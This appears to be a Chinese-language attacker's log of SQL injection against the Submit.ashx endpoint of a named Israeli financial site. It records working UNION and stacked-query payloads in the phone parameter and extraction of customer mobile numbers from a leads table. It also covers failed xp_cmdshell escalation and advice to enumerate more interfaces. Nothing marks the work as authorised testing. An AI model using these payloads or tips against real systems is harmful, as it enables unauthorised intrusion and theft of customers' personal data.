# AS-Invest hdpro — Submit.ashx phone 参数 SQL 注入（UNION+堆叠）

> 目标：hdpro.co.il 的 Submit.ashx（ASP.NET + SQL Server）
> 手法：phone 参数注入 → UNION + 堆叠查询成立 → leads 表含以色列手机号
> 阻塞：xp_cmdshell 权限不足 + 盲注响应不稳

## 注入确认

```http
POST /Submit.ashx
Content-Type: application/x-www-form-urlencoded

phone=' OR '1'='1
→ SQL Server 错误（确认注入点）

phone=' UNION SELECT 1--
→ 成功（UNION 注入成立）

phone=' UNION SELECT 0--
→ 失败（布尔差异可观测）

phone=';SELECT 1--
→ 成功（堆叠查询成立）
```

## 数据提取

```sql
-- 表名确认
phone=' UNION SELECT top 1 phone FROM leads--
→ 成功 → leads 表 + phone 列存在

-- 字段长度
phone=' AND LEN(MAX(phone))=10--
→ True → 以色列手机号（10 位）

-- 架构信息
→ 报错: "User ICREATEUserProd doesn't have execute role on interface number 22060"
→ 证实数据库用户是 ICREATEUserProd（与源码泄露一致）
```

## 阻塞点

| 尝试 | 结果 |
|------|------|
| xp_cmdshell | 权限不足（数据库账号无 sysadmin）|
| sp_configure | 同上 |
| 盲注逐字符提取 | `top 1` 无 ORDER BY → 行不稳定 + 响应判断不稳 |
| UNION 枚举列数 | 单列 UNION 成功，多列需进一步枚举 |

## 手法要点

1. **phone 参数是高频注入点** — 用户输入直接拼 SQL，开发者常忽略手机号需要参数化
2. **UNION + 堆叠双成立** — SQL Server 默认支持堆叠查询，但实际利用受权限限制
3. **leads 表是 CRM 核心** — 含客户手机号，在金融平台等于客户名单
4. **`top 1` 无 ORDER BY** — SQL Server 的 `top 1` 不保证行顺序，盲注提取时结果不稳定 → 必须加 ORDER BY
5. **接口号枚举** — 错误信息泄露 `interface number 22060`，可枚举 22059-22090 找更多接口

## 与 sqlmap 对照

此场景手动注入优于 sqlmap，因为：
- .ashx 的响应模式非标准（非 HTTP 200/500 二分法）
- 参数化注入点在 phone 字段（非 URL 参数）
- 堆叠查询成功但 xp_cmdshell 权限不足 → sqlmap 的 `--os-shell` 无效
- 手动 UNION 可以精确控制 `top 1 ... FROM leads`
